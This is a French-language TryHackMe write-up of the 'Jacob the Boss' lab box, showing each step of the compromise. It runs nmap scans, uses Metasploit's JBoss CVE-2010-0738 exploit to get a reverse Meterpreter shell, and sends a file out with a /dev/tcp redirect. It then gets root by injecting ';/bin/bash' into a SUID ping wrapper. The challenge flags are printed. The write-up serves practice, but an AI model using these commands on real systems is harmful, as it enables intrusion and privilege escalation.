# Jacob the Boss #

## Task 1 Go on, it's your machine! ##

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.170.56 jacobtheboss.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 
tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A jacobtheboss.thm -p-  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-06 11:52 CEST
Nmap scan report for jacobtheboss.thm (10.10.170.56)
Host is up (0.032s latency).
Not shown: 65515 closed ports
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:ca:13:6e:d9:63:c0:5f:4a:23:a5:a5:a5:10:3c:7f (RSA)
|   256 a4:6e:d2:5d:0d:36:2e:73:2f:1d:52:9c:e5:8a:7b:04 (ECDSA)
|_  256 6f:54:a6:5e:ba:5b:ad:cc:87:ee:d3:a8:d5:e0:aa:2a (ED25519)
80/tcp    open  http         Apache httpd 2.4.6 ((CentOS) PHP/7.3.20)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.20
|_http-title: My first blog
111/tcp   open  rpcbind      2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
1090/tcp  open  java-rmi     Java RMI
|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
1098/tcp  open  java-rmi     Java RMI
1099/tcp  open  java-object  Java Object Serialization
| fingerprint-strings: 
|   NULL: 
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     http://jacobtheboss.box:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpw;
|     UnicastRef2
|_    jacobtheboss.box
3306/tcp  open  mysql        MariaDB (unauthorized)
3873/tcp  open  java-object  Java Object Serialization
4444/tcp  open  java-rmi     Java RMI
4445/tcp  open  java-object  Java Object Serialization
4446/tcp  open  java-object  Java Object Serialization
4457/tcp  open  tandem-print Sharp printer tandem printing
4712/tcp  open  msdtc        Microsoft Distributed Transaction Coordinator (error)
4713/tcp  open  pulseaudio?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    b42b
8009/tcp  open  ajp13        Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|   Potentially risky methods: PUT DELETE TRACE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp  open  http         Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Welcome to JBoss&trade;
8083/tcp  open  http         JBoss service httpd
|_http-title: Site doesn't have a title (text/html).
18683/tcp open  unknown
38856/tcp open  java-rmi     Java RMI
46123/tcp open  unknown
5 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1099-TCP:V=7.91%I=7%D=9/6%Time=6135E4F0%P=x86_64-pc-linux-gnu%r(NUL
SF:L,16F,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x1e\x97\
SF:xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08objByte
SF:sq\0~\0\x01xp\xad\x93\[\xafur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02
SF:\0\0xp\0\0\0\.\xac\xed\0\x05t\0\x1dhttp://jacobtheboss\.box:8083/q\0~\0
SF:\0q\0~\0\0uq\0~\0\x03\0\0\0\xc7\xac\xed\0\x05sr\0\x20org\.jnp\.server\.
SF:NamingServer_Stub\0\0\0\0\0\0\0\x02\x02\0\0xr\0\x1ajava\.rmi\.server\.R
SF:emoteStub\xe9\xfe\xdc\xc9\x8b\xe1e\x1a\x02\0\0xr\0\x1cjava\.rmi\.server
SF:\.RemoteObject\xd3a\xb4\x91\x0ca3\x1e\x03\0\0xpw;\0\x0bUnicastRef2\0\0\
SF:x10jacobtheboss\.box\0\0\x04J\0\0\0\0\0\0\0\0\r\xb9\xcb\?\0\0\x01{\xba\
SF:x82\x17y\x80\0\0x");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3873-TCP:V=7.91%I=7%D=9/6%Time=6135E4F6%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4445-TCP:V=7.91%I=7%D=9/6%Time=6135E4F6%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4446-TCP:V=7.91%I=7%D=9/6%Time=6135E4F6%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4713-TCP:V=7.91%I=7%D=9/6%Time=6135E4F6%P=x86_64-pc-linux-gnu%r(NUL
SF:L,5,"b42b\n")%r(GenericLines,5,"b42b\n")%r(GetRequest,5,"b42b\n")%r(HTT
SF:POptions,5,"b42b\n")%r(RTSPRequest,5,"b42b\n")%r(RPCCheck,5,"b42b\n")%r
SF:(DNSVersionBindReqTCP,5,"b42b\n")%r(DNSStatusRequestTCP,5,"b42b\n")%r(H
SF:elp,5,"b42b\n")%r(SSLSessionReq,5,"b42b\n")%r(TerminalServerCookie,5,"b
SF:42b\n")%r(TLSSessionReq,5,"b42b\n")%r(Kerberos,5,"b42b\n")%r(SMBProgNeg
SF:,5,"b42b\n")%r(X11Probe,5,"b42b\n")%r(FourOhFourRequest,5,"b42b\n")%r(L
SF:PDString,5,"b42b\n")%r(LDAPSearchReq,5,"b42b\n")%r(LDAPBindReq,5,"b42b\
SF:n")%r(SIPOptions,5,"b42b\n")%r(LANDesk-RC,5,"b42b\n")%r(TerminalServer,
SF:5,"b42b\n")%r(NCP,5,"b42b\n")%r(NotesRPC,5,"b42b\n")%r(JavaRMI,5,"b42b\
SF:n")%r(WMSRequest,5,"b42b\n")%r(oracle-tns,5,"b42b\n")%r(ms-sql-s,5,"b42
SF:b\n")%r(afp,5,"b42b\n")%r(giop,5,"b42b\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=9/6%OT=22%CT=1%CU=42112%PV=Y%DS=2%DC=T%G=Y%TM=6135E5B7
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%II=I%TS=A)SEQ(SP=10
OS:3%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3
OS:=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=68DF%W2=6
OS:8DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Windows; Device: printer; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   30.97 ms 10.9.0.1
2   31.07 ms jacobtheboss.thm (10.10.170.56)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 214.19 seconds

```

On voit plusieurs service :
Le service SSH sur le port 22.   
Le service HTTP sur le port 80, 8080 et 8083.   
Le service RPCBIND sur le port 111.   
D'autres services java, mysql, etc...     

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A --script vuln jacobtheboss.thm -p-
...
8080/tcp  open  http         Apache Tomcat/Coyote JSP engine 1.1
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=jacobtheboss.thm
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://jacobtheboss.thm:8080/jmx-console/HtmlAdaptor?action=displayMBeans
|     Form id: applyfilter
|_    Form action: HtmlAdaptor?action=displayMBeans
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /web-console/ServerInfo.jsp: JBoss Console
|   /web-console/Invoker: JBoss Console
|   /invoker/JMXInvokerServlet: JBoss Console
|_  /jmx-console/: JBoss Console
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 10
|_http-server-header: Apache-Coyote/1.1
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2010-0738: 
|_  /jmx-console/: Authentication was not required
...
```

Sur le port 8080 on trouve un la vulnérabilité cve2010-0738 qui a pas besoin d'authentification.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ msfconsole -q
[!] The following modules could not be loaded!
[!] 	/usr/share/metasploit-framework/modules/auxiliary/gather/office365userenum.py
[!] Please see /home/tim/.msf4/logs/framework.log for details.
msf6 > search cve-2010-0738

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  auxiliary/admin/http/jboss_bshdeployer                                normal     No     JBoss JMX Console Beanshell Deployer WAR Upload and Deployment
   1  exploit/multi/http/jboss_bshdeployer                 2010-04-26       excellent  No     JBoss JMX Console Beanshell Deployer WAR Upload and Deployment
   2  exploit/multi/http/jboss_maindeployer                2007-02-20       excellent  No     JBoss JMX Console Deployer Upload and Execute
   3  auxiliary/admin/http/jboss_deploymentfilerepository                   normal     No     JBoss JMX Console DeploymentFileRepository WAR Upload and Deployment
   4  exploit/multi/http/jboss_deploymentfilerepository    2010-04-26       excellent  No     JBoss Java Class DeploymentFileRepository WAR Deployment
   5  auxiliary/scanner/http/jboss_vulnscan                                 normal     No     JBoss Vulnerability Scanner
   6  auxiliary/scanner/sap/sap_icm_urlscan                                 normal     No     SAP URL Scanner


Interact with a module by name or index. For example info 6, use 6 or use auxiliary/scanner/sap/sap_icm_urlscan
```
On trouve des exploits 

```bash
msf6 > use 4
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/jboss_deploymentfilerepository) > options

Module options (exploit/multi/http/jboss_deploymentfilerepository):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   APPBASE                     no        Application base name, (default: random)
   JSP                         no        JSP name to use without .jsp extension (default: random)
   PACKAGE                     no        The package containing the BSHDeployer service
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      8080             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /jmx-console     yes       The URI path of the JMX console
   VERB       POST             yes       HTTP Method to use (for CVE-2010-0738) (Accepted: GET, POST, HEAD)
   VHOST                       no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.26     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Java based)


msf6 exploit(multi/http/jboss_deploymentfilerepository) > set RHOSTS jacobtheboss.thm
RHOSTS => jacobtheboss.thm
msf6 exploit(multi/http/jboss_deploymentfilerepository) > set LHOST 10.9.228.66
LHOST => 10.9.228.66
msf6 exploit(multi/http/jboss_deploymentfilerepository) > run

[*] Started reverse TCP handler on 10.9.228.66:4444 
[*] Attempting to automatically select a target...
[*] Automatically selected target "Java Universal"
[*] Deploying stager for the WAR file
[*] Calling stager to deploy the payload warfile (might take some time)
[*] Try to call the deployed payload
[*] Undeploying stager and payload WARs via DeploymentFileRepository.remove()...
[*] Sending stage (58060 bytes) to 10.10.170.56
[*] Meterpreter session 1 opened (10.9.228.66:4444 -> 10.10.170.56:51199) at 2021-09-06 14:23:50 +0200

```

On utilise l'exploit exploit/multi/http/jboss_deploymentfilerepository 
On le configure correctement.  
On le lance et on obtient un shell meterpreter. 

**user.txt**

```bash
meterpreter > shell
Process 1 created.
Channel 1 created.
whoami
jacob
cat /home/jacob/user.txt
f4d491f280de360cc49e26ca1587cbcc
```

On demande un shell.   
On est connecter sous jacob.   
Dans le répertoire jacob on trouve un fichier user.txt.
On le lit et on a le flag.   

La réponse est : f4d491f280de360cc49e26ca1587cbcc   

**root.txt**

```bash
find / -perm -4000 2>/dev/null
/usr/bin/pingsys
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chage
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
```

On cherche un programme vulnérable suid.   
Le programme pingsys ne semble pas standart.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lp 1234 > pingsys
-------------------------------
cat /usr/bin/pingsys > /dev/tcp/10.9.228.66/1234
```

On transfert le fichier pour analyse.  

```cpp

void main(undefined4 param_1,long param_2)

{
  undefined8 uVar1;
  undefined *__command;
  int iVar2;
  ulong uVar3;
  long alStack64 [2];
  undefined4 local_2c;
  undefined *local_28;
  long local_20;
  
  local_2c = param_1;
  alStack64[1] = param_2;
  local_20 = (long)BUFFERSIZE + -1;
  uVar3 = ((long)BUFFERSIZE + 0xfU) / 0x10;
  local_28 = (undefined *)(alStack64[1] + uVar3 * 0x1ffffffffffffffe);
  uVar1 = *(undefined8 *)(param_2 + 8);
  alStack64[uVar3 * 0x1ffffffffffffffe] = 0x4006a5;
  snprintf((char *)(alStack64[1] + uVar3 * 0x1ffffffffffffffe),(long)BUFFERSIZE,"ping -c 4 %s",uVar1
           ,(long)BUFFERSIZE,0);
  alStack64[uVar3 * 0x1ffffffffffffffe] = 0x4006af;
  iVar2 = setuid(0,*(undefined *)(alStack64 + uVar3 * 0x1ffffffffffffffe));
  if (iVar2 == -1) {
    alStack64[uVar3 * 0x1ffffffffffffffe] = 0x4006c3;
    printf("setUID ERROR");
  }
  __command = local_28;
  alStack64[uVar3 * 0x1ffffffffffffffe] = 0x4006cf;
  system(__command,*(undefined *)(alStack64 + uVar3 * 0x1ffffffffffffffe));
  return;
}
```
On décompile le programme avec ghidra.   
On voit que dans le programme il y a aucune fonction de vérification de chaîne que l'on passe en paramètre, para_2 va directement dans alStack64.      
Il exécute directement la commande par la fonction system.   

```bash
pingsys '127.0.0.1;/bin/bash'
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.032 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.031 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.031 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3000ms
rtt min/avg/max/mdev = 0.020/0.028/0.032/0.007 ms
id
uid=0(root) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
cat /root/root.txt
29a5641eaa0c01abe5749608c8232806
```

On dit on programme de nous exécuter /bin/bash.   
On obtient un shell root.   
Dans le fichier root.txt qui est dans le répertoire root on obtient le flag.   

La réponse est : 29a5641eaa0c01abe5749608c8232806    